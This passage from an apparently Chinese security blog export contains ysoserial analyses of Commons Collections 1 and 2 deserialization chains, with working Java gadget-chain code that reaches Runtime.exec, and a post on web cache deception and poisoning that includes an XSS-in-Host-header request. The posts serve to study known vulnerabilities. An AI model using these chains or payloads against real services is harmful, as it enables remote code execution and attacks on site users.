Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer transformer  = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(map,transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap,<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashtable.put(<span class="string">"foo"</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Field field = hashtable.getClass().getDeclaredField(<span class="string">"table"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        Object[] table = (Object[]) field.get(hashtable);</span><br><span class="line">        Object entry = table[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (entry==<span class="keyword">null</span>)&#123;</span><br><span class="line">            entry = table[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field keyfield = entry.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        keyfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        keyfield.set(entry,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(hashtable);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结果如下:</p>
<p><img src="2.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://blog.0kami.cn/2019/10/31/study-java-deserialized-commonscollections3-others/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections5,6,7,9,10</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>ysoserial分析之CommonsCollections2</title>
    <url>/2020/04/24/ysoserial-analyze-2/</url>
    <content><![CDATA[<p>这篇文章分析的是CommonsCollections2，与之前不同的是，它是在commonscollections4.0版本下的利用链。与CommonsCollections3一样的是，它也是利用TemplatesImpl对象来执行任意命令的。接下来就来具体分析分析它。</p>
<a id="more"></a>

<p>前面已经分析过的文章</p>
<p><a href="https://ananaskr.github.io/2020/04/20/ysoserial-analyze/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections1</a><br><a href="https://ananaskr.github.io/2020/04/23/ysoserial-analyze-3/" target="_blank" rel="noopener">ysoserial分析之CommonsCollections3</a></p>
<p>与CommonsCollections3一样的是，它也是利用<code>TemplatesImpl</code>来进行最终的命令执行<font color=#008000>(commons-collections:4.0版本下的利用链利用的都是<code>TemplatesImpl</code>)</font>。不同的是它用到了一个新类<code>PriorityQueue</code>来触发transform函数。<code>PriorityQueue</code>类。这个类有什么作用呢？让我们来分析分析。</p>
<p>整个反序列化利用链如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">	-&gt;PriorityQueue.readObject()</span><br><span class="line">		-&gt;PriorityQueue.heapify()</span><br><span class="line">			-&gt;PriorityQueue.siftDown()</span><br><span class="line">				-&gt;PriorityQueue.siftDownUsingComparator()</span><br><span class="line">					-&gt;TransformingComparator.compare()</span><br><span class="line">						-&gt;InvokerTransformer.transform()</span><br><span class="line">							-&gt;TemplatesImpl.newTransform()</span><br></pre></td></tr></table></figure>


<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>首先在反序列化的过程中所需要用的类必须实现了<code>Serilizable</code>类。<code>PriorityQueue</code>也不例外。观察它的<code>readObject</code>类。</p>
<p><img src="1.png" alt=""></p>
<p>前面的几行都是普通的反序列化函数，让我们直接看看<code>heapify</code>。</p>
<p><img src="2.png" alt=""></p>
<p><code>heapify</code>函数连直接调用了<code>siftDown</code>，跟进<code>siftDown</code>。</p>
<p><img src="3.png" alt=""></p>
<p>若<code>comparator</code>不为空，则进入了<code>SiftDownUsingComparator</code>函数，跟进它。</p>
<p><img src="4.png" alt=""></p>
<p>在<code>SiftDownUsingComparator</code>函数中，继续跟进<code>comparator.compare</code>函数。此时进入的是<code>TransformingComparator</code>的compare函数，如下所示</p>
<p><img src="5.png" alt=""></p>
<p>在这里就看到了熟悉的<code>this.transformer.transform()</code>。在CommonsCollections2中利用的是<code>InvokerTransformer</code>的反射机制来调用<code>newTransformer</code>函数，从而进入利用TemplatesImpl对象的RCE。除了InvokerTransformer外，CommonsCollection3中的<code>InstantiateTransformer</code>触发<code>TrAXFilter</code>初始化也能达到同样的效果，不过这是CommonsCollections4使用的方法。</p>
<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><p>根据上面的分析可以得知，需要指定<code>PriorityQueue</code>类的<code>comparator</code>变量为<code>TransformingComparator</code>类，而<code>TransformingComparator</code>类中的Transformer需要是<code>InvokerTransformer</code>。很容易写出如下的payload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"newTransformer"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>],<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">        TransformingComparator transcomparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br></pre></td></tr></table></figure>

<p><code>newTransformer</code>函数的主体是TemplatesImpl对象，因此传入<code>this.transformer.transform(obj)</code>中的obj是一个TemplatesImpl对象。而该对象是PriorityQueue类的queue成员变量。因此，需要实例化一个PriorityQueue类，其成员变量comparator是一个TransformingComparator对象，成员变量queue是一个TemplatesImpl对象。</p>
<p>可以看到在<code>PriorityQueue</code>类中，<code>queue</code>这个成员变量被<code>transient</code>关键字修饰，是不能被序列化的。但是在<code>PriorityQueue</code>类的writeObject方法中，首先调用了ObjectOutputStream中的defaultWriteObject方法，该方法会执行默认的序列化机制，在进行序列化时，会先忽略掉被<code>transient</code>修饰的queue字段。然后调用了<code>writeObject</code>方法显示地将queue字段写入到ObjectOutputStream中。</p>
<p><img src="6.png" alt=""></p>
<p>查看<code>PriorityQueue</code>类的构造函数，需要两个参数，需要注意的是<code>initCapacity</code>在其注释中有说明需要1.5的Capacity，因此在初始化时将其设为2。初始化的代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>,transcomparator);</span><br><span class="line"></span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">priorityQueue.add(<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>然后queue里面的值为TemplatesImpl对象，使用CommonsCollections3中的构造方法，然后对Priority类中的queue成员进行设置。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Object[] queue = &#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line"> </span><br><span class="line">Field field6 = priorityQueue.getClass().getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">field6.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">field6.set(priorityQueue,queue);</span><br></pre></td></tr></table></figure>


<blockquote>
<p>ysoserial中实例化InvokerTransformer类时，它首先调用的toString方法，然后才将其换成newTransformer方法。这是因为在前面<code>priorityQueue.add(1)</code>也会调用到InvokerTransformer，这时候Integrity对象1并没有newTransformer方法会报错。</p>
</blockquote>
<h3 id="完整demo"><a href="#完整demo" class="headerlink" title="完整demo"></a>完整demo</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8207363842866235160L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">         String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">         String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                 command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                 <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">         Object templates = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>).newInstance();</span><br><span class="line"></span><br><span class="line">         ClassPool pool = ClassPool.getDefault();</span><br><span class="line">         pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">         pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">         CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">         clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">         CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">         clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">         Field field = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">         field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         field.set(templates,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes,classFiles.classAsBytes(Foo<span class="class">.<span class="keyword">class</span>)&#125;)</span>;</span><br><span class="line"></span><br><span class="line">         Field field2 = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">         field2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         field2.set(templates,<span class="string">"ananaskr12345"</span>);</span><br><span class="line"></span><br><span class="line">         Field field3 = templates.getClass().getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">         field3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">         field3.set(templates, TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line">         <span class="comment">//create templates</span></span><br><span class="line"></span><br><span class="line">         InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"toString"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>],<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">         TransformingComparator transcomparator = <span class="keyword">new</span> TransformingComparator(transformer);</span><br><span class="line">         PriorityQueue priorityQueue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>,transcomparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">         priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">         Object[] queue = &#123;templates,<span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">        Field field5 = transformer.getClass().getDeclaredField(<span class="string">"iMethodName"</span>);</span><br><span class="line">        field5.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field5.set(transformer, <span class="string">"newTransformer"</span>);</span><br><span class="line"></span><br><span class="line">        Field field6 = priorityQueue.getClass().getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        field6.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field6.set(priorityQueue,queue);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">         ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">         out.writeObject(priorityQueue);</span><br><span class="line">         out.flush();</span><br><span class="line">         out.close();</span><br><span class="line"></span><br><span class="line">         <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line">         ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">         in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再加上ysoserial中的classFiles.java。运行结果如下:</p>
<p><img src="7.png" alt=""></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://blog.0kami.cn/2019/11/05/study-java-deserialized-commonscollections4/" target="_blank" rel="noopener">Java反序列化利用链挖掘之CommonsCollections2,4,8</a></li>
<li><a href="https://www.cnblogs.com/tr1ple/p/12382559.html" target="_blank" rel="noopener">java反序列化-ysoserial-调试分析总结篇(2)</a></li>
</ul>
]]></content>
      <categories>
        <category>JAVA安全</category>
      </categories>
      <tags>
        <tag>CommonsCollections</tag>
      </tags>
  </entry>
  <entry>
    <title>Web缓存欺骗(WCD)与Web缓存投毒(WCP)</title>
    <url>/2020/07/18/wcd/</url>
    <content><![CDATA[<p>Web缓存欺骗和Web缓存投毒是一种新的Web攻击向量，它使得多种Web缓存技术(如CDN、负载均衡器、反向代理)和框架都面临风险。两者都利用了web缓存，但在利用方式上有着不同。</p>
<a id="more"></a>

<h1 id="Web缓存欺骗"><a href="#Web缓存欺骗" class="headerlink" title="Web缓存欺骗"></a>Web缓存欺骗</h1><p>在存在web缓存的情况下，通过”欺骗”用户访问一个不存在的静态页面，从而使敏感页面保存在缓存中，从而当攻击者再次访问此不存在的静态页面，就能从缓存中获取到用户的敏感信息。</p>
<h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><ul>
<li>web缓存功能设置为通过url的扩展名来判断是否缓存文件，且忽略任何缓存头(服务器端返回的响应中没有no-store指令或可被绕过)。</li>
<li>使用rewrite、pathinfo类似的模式，当访问/xxx.php/non-existen.css时，返回/xxx.php的内容。</li>
<li>“欺骗”用户点击时，用户需要认证状态。</li>
</ul>
<h2 id="web缓存实例"><a href="#web缓存实例" class="headerlink" title="web缓存实例"></a>web缓存实例</h2><h3 id="1-Cloudflare"><a href="#1-Cloudflare" class="headerlink" title="1. Cloudflare"></a>1. Cloudflare</h3><p>当来自web服务器的文件到达Cloudflare时。文件会进行两阶段处理。</p>
<ul>
<li>检查目标站点、文件来源目录是否设置了缓存功能。</li>
<li>检查是否以特定的静态扩展名结尾。<code>class, css, jar, js, jpg, jpeg, gif, ico, png, bmp, pict, csv, doc, docx, xls, xlsx, ps, pdf, pls, ppt, pptx, tif, tiff, ttf, otf, webp, woff, woff2, svg, svgz, eot, eps, ejs, swf, torrent, midi, mid</code>。</li>
<li>检查HTTP缓存头部是否存在。实际中cloudflare存在”边缘缓存过期TTL”的功能，这个功能可以用来覆盖任何已有的头部信息。当该功能</li>
</ul>
<h3 id="2-NGINX"><a href="#2-NGINX" class="headerlink" title="2. NGINX"></a>2. NGINX</h3><p>作为负载均衡服务器，NGINX也可以提供缓存功能，来缓存从web服务器返回的页面。通过NGINX配置文件设置缓存规则，若配置的忽略头部中包含Cache-Control，则会忽略文件的缓存头部。</p>
<h3 id="3-IIS-ARR"><a href="#3-IIS-ARR" class="headerlink" title="3. IIS ARR"></a>3. IIS ARR</h3><p>ARR(Application Request Routing,应用程序请求路由)模块可以为IIS带来负载均衡功能。IIS ARR中存在可以忽略文件的缓存头部的选项，导致即使服务器设置了no-store也无济于事。</p>
<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><ul>
<li>确定是否架设了CDN、负载均衡器、反向代理等缓存设备。</li>
<li>观察响应头是否设置<code>Cache Control: no-cache,max-age=0,private, no-store</code>。</li>
<li><a href="https://github.com/arbazkiraak/web-cache-deception-checker" target="_blank" rel="noopener">web-cache-deception-checker</a></li>
</ul>
<h2 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h2><ul>
<li>严格配置缓存策略，只有当文件的HTTP缓存头部允许缓存时，才会缓存文件。</li>
<li>在处理不存在资源时，返回404/302，而不是返回上一级的内容。</li>
<li>设置<code>Vary:Cookie</code>根据Cookie设置缓存，不同cookie的用户缓存页面不相同。</li>
</ul>
<h1 id="web缓存投毒"><a href="#web缓存投毒" class="headerlink" title="web缓存投毒"></a>web缓存投毒</h1><p>Web缓存投毒在以前一直是一个难以琢磨的漏洞，是一种理论上但实际难以利用的问题。在2018年BlackHat上，提出了实战的几个例子，证明了器危害和可利用性。<br>web缓存投毒(Web Cache Poisonning)的攻击方式是使得缓存机制缓存了有害的页面，当正常用户命中该缓存时，就会被有害页面攻击。</p>
<p>它的整个过程如下图所示:</p>
<p><img src="1.png" alt=""></p>
<p>那么如何使得缓存机制缓存有害的页面？在这里先介绍一个Vary响应头，MDN解释它决定了对于未来的一个请求头，应该用一个缓存的回复还是向源服务器请求一个新的回复。举例<code>Vary:User-Agent</code>时，会根据User-Agent的值来返回缓存，以防移动端获取了PC端的缓存。这里的User-Agent成为了缓存键。</p>
<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>如存在一个页面它存在self XSS，比如。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">    &lt;html class&#x3D;&quot;no-js&quot; lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">      &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;</span><br><span class="line">        &lt;title&gt;Sample&lt;&#x2F;title&gt;</span><br><span class="line">        &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&#x2F;&#x2F;&lt;?php echo $_SERVER[&#39;SERVER_NAME&#39;]； ?&gt;&#x2F;static&#x2F;css&#x2F;main.css&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>它接收攻击者可控的Host头直接输出在页面上，且攻击者无法控制用户的HTTP头，从而是一个self XSS。于是攻击者发送如下的请求</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">    Host: example.com&quot;&gt;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>将有害的页面存储下来了，那么其他用户访问这同意资源时，就会触发XSS漏洞，通过缓存投毒，一个self xss就转变为了存储型XSS了。</p>
<h1 id="缓解措施-1"><a href="#缓解措施-1" class="headerlink" title="缓解措施"></a>缓解措施</h1><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://r1dd1er.top/2020/02/10/web%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92&%E7%BC%93%E5%AD%98%E6%AC%BA%E9%AA%97/" target="_blank" rel="noopener">Web缓存投毒与缓存欺骗</a></li>
<li><a href="https://xz.aliyun.com/t/2585" target="_blank" rel="noopener">实战web缓存中毒</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>ysoserial分析之CommonsCollections1</title>
    <url>/2020/04/20/ysoserial-analyze-1/</url>
    <content><![CDATA[<p>在上一篇<a href="https://ananaskr.github.io/2020/04/20/common-collections/" target="_blank" rel="noopener">文章</a>中，分析了使用commons-collections用来进行RCE的原理。那么在实际情况中，需要找到一个反序列化链来RCE。这篇文章分析的就是CommonsCollections1。让我们来看看它是如何构造反序列化链的。</p>
<a id="more"></a>

<p>需要找到一个符合一下条件的类，并且在服务端有反序列化的入口，就可以RCE了。</p>
<ul>
<li>该类重写了readObject方法</li>
<li>该类的readObject方法中操作了<code>TransformedMap</code>，比如调用setValue、put、putAll</li>
</ul>
<p>搜索了一下调用<code>transform</code>的位置，最有可能被利用的就是LazyMap.get、TransformedMap.checkSetValue，其中checkSetValue会在Entry.setValue函数被调用的时候调用。定位到TransformedMap的父类<code>AbstractInputCheckedMapDecorator</code>中的<code>MapEntry</code>类的<code>setValue</code>方法:</p>
<p><img src="1.png" alt=""></p>
<p>可以看到调用了checkSetValue方法。因此需要在被重载的readObject函数中发现相关可控Map数据的操作(LazyMap.get和Entry.setValue)。对应的对于CommonsCollections1有了2种利用链。</p>
<h1 id="01-TransformedMap-checkSetValue"><a href="#01-TransformedMap-checkSetValue" class="headerlink" title="01 TransformedMap.checkSetValue"></a>01 TransformedMap.checkSetValue</h1><p>先来看第一种，利用<code>TransformedMap.checkSetValue</code>。整个的利用链如下所示:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-&gt;AnnotationInvocationHandler.readObject()</span><br><span class="line">  -&gt;TransformedMap.entrySet().iterator().next.setValue()</span><br><span class="line">    -&gt;TransformedMap.checkSetValue()</span><br><span class="line">      -&gt;TransformedMap.transform()</span><br><span class="line">		  -&gt;ChainedTransformer.transform()</span><br><span class="line">		    -&gt;ConstantTransformer.transform()</span><br><span class="line">			   -&gt;InvokerTransformer.transform()</span><br><span class="line">				  -&gt;Method.invoke()</span><br><span class="line">				    -&gt;Class.getMethod()</span><br><span class="line">			   -&gt;InvokerTransformer.transform()</span><br><span class="line">				  -&gt;Method.invoke()</span><br><span class="line">				    -&gt;Runtime.getRuntime()</span><br><span class="line">			   -&gt;InvokerTransformer.transform()</span><br><span class="line">				  -&gt;Method.invoke()</span><br><span class="line">				    -&gt;Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>利用条件:  </p>
<ul>
<li>&lt;= JRE 8u72</li>
<li>commonscollections:3.1, 3.2, 3.2.1</li>
</ul>
<p>参考:<a href="http://www.thegreycorner.com/2016/05/commoncollections-deserialization.html" target="_blank" rel="noopener">CommonsCollections deserialization attack payloads from ysoserial failing</a></p>
<p>commonscollections:3.2.2中对不安全的Java类的反序列化增加了开关，默认为关闭状态。比如InvokerTransformer。</p>
<h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>CommonsCollections1反序列化调用链最外层利用的是<code>AnnotationInvocationHandler</code>类(sub.reflect.annotation.AnnotationInvocationHandler)。它实现了<code>java.lang.reflect.InvocationHandler</code>(Java动态代理)接口和<code>java.io.Serializable</code>接口。</p>
<p>首先定位到<code>AnnotationInvocationHandler</code>类的readObject函数。可以看到在readObject函数中361行调用了setValue方法且是在Entry中调用的，Entry var5又来自<code>this.memberValues.entrySet().iterator()</code>。</p>
<p><img src="1-1.png" alt=""></p>
<p>因此当获取到this.memberValues为TransformedMap时，就调用了Entry.setValue，从而到了TransformedMap.checkSetValue方法</p>
<p><img src="2.png" alt=""></p>
<p>看到checkSetValue方法中的<code>this.valueTransformer.transform(value)</code>就到了熟悉的Transformer了。到这里整个利用链就结束了。</p>
<p>memberValues是<code>AnnotationInvocationHandler</code>的成员变量，memberValues的值是在<code>var1.defaultReadObject()</code>时反序列化生成的。可以通过在<code>var1.defaultReadObject()</code>下断点，进入<code>defaultReadObject()</code>函数中，在经过<code>defaultReadFields()</code>后，memberValues值被赋为传入的<code>TransformedMap</code>如下图所示:</p>
<p><img src="1-2.png" alt=""></p>
<h2 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h2><p>首先实例化出一个TransformedMap对象，其中<code>this.valueTransformer</code>为构造的TransformedChain对象。代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(<span class="string">"value"</span>,<span class="string">"value"</span>);</span><br><span class="line">Map transformedMap = TransformedMap.decorate(map,<span class="keyword">null</span>,transformedChain);</span><br></pre></td></tr></table></figure>

<p>然后在AnnotationInvocationHandler对象反序列化时需要使得<code>this.memberValue</code>为TransformedMap对象。看一下AnnotationInvocationHandler的构造函数。</p>
<p><img src="3.png" alt=""></p>
<p>传入一个注解类以及Map类。创建AnnotationInvocationHandler对象。因为<code>AnnotationInvocationHandler</code>是一个内部API专用的类，在外部无法通过类名创建实例，需要通过反射的方式创建出<code>AnnotationInvocationHandler</code>对象。代码如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forname(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line"></span><br><span class="line">Constructor constructor = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">Object instance = constructor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">transformedMap</span>)</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>创建时map的key名称必须对应创建AnnotationInvocationHandler时使用的注解方法名。比如创建AnnotationInvocationHandler时传入的注解是<code>java.lang.annotation.Target</code>，那么map的key必须是@Target注解中的方法名，即: value。至于为什么传入Target注解而不是其他注解，传入其他注解如@Retention也可以，@Retention注解中的方法名也是value。</p>
</blockquote>
<p>通过分析可知，在<code>readObject()</code>函数中，Map类型的var3是key为value，值为class。在357行中，若var6的值为”ananaskr”，而不是”value”，获取到的var7为空。从而在后面的if判断中，无法进入setValue的执行。</p>
<p><img src="1-3.png" alt=""></p>
